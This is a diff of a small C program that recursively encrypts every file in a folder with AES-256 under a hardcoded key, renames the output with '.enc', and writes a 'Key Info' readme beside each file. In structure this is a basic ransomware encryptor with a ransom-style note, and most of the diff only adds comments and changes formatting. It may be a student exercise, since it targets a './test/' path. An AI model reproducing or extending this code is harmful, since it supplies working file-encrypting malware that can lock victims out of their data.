@@ -1,10 +1,14 @@
+/* 
+ * Author : Pratik Padalia
+ * Encrypts every file under the given folder
+ */
+
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <dirent.h>
 #include <openssl/evp.h>
 #include <openssl/aes.h>
-
 
 void ls_dir(char* start_path);
 void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);
@@ -13,15 +17,14 @@ int main()
 {	
 	char* start_path;
 	start_path = "./test/";
-    ls_dir(start_path);
-
-    return 0;
+	ls_dir(start_path);
+	return 0;
 }
 
 void ls_dir(char* start_path)
 {
-	unsigned char key[] = "12345678901234561234567890123456";// 32 char 256bit key
-    unsigned char iv[] = "1234567890123456";//same size as block 16 char 128 bit block
+	unsigned char key[] = "12345678901234561234567890123456"; // 32 char 256bit key
+    unsigned char iv[] = "1234567890123456"; //same size as block 16 char 128 bit block
 
 	DIR* dir;
 	struct dirent *ent;
@@ -31,6 +34,8 @@ void ls_dir(char* start_path)
 		{
 			int len = strlen(ent->d_name);
 			const char* last_four = &ent->d_name[len-4];
+
+			// avoid re-encryption of already encrypted files
 			if(strcmp(last_four,".enc") != 0)
 			{
 				if(ent->d_type == 8)
@@ -43,19 +48,11 @@ void ls_dir(char* start_path)
 					strcat(full_path,ent->d_name);
 					char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);
 
-					// printf("original : %s\n",full_path);
-					// unsigned char ciphertext[128];
-					// strcpy(ciphertext,full_path);
-					// /* Encrypt the plaintext */
-					// int ciphertext_len = encrypt (full_path, strlen ((char *)full_path), key, iv, ciphertext);
-					// printf("encrypted : %s\n",ciphertext);
-
-					// unsigned char decryptedtext[128];
-					// int decryptedtext_len = decrypt(ciphertext, ciphertext_len, key, iv, decryptedtext);
-					// printf("decrypted : %s\n",decryptedtext);
-
 					strcpy(new_name,full_path);
+					// add suffix to file name to identify an encrypted file
 					strcat(new_name,".enc");
+
+					// ignore password files
 					if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)
 					{
 						FILE* fpin;
@@ -66,7 +63,7 @@ void ls_dir(char* start_path)
 						fpout=fopen(new_name,"wb");
 						fpreadme=fopen(full_path_readme,"w");
 						
-						fprintf(fpreadme,"Key Info \n\n Pratik & Kishan \n");
+						fprintf(fpreadme,"Key Info \n\n Pratik \n");
 						fclose(fpreadme);
 						
 						encryptfile(fpin,fpout,key,iv);
@@ -119,7 +116,8 @@ void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv)
 		fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
 		if(bytes_read < bufsize)
 		{
-			break;//EOF
+			//EOF
+			break;
 		}
 	}
 
